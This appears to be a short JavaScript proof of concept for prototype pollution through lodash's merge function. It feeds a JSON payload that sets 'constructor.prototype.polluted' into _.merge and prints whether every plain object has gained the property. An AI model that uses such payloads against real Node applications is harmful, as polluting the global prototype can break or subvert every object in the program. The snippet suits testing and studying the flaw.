var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const _ = require('lodash');
let payload = JSON.parse('{"constructor": {"prototype": {"polluted": "yes"}}}');
console.log({}.polluted);
_.merge(obj, payload);
console.log({}.polluted);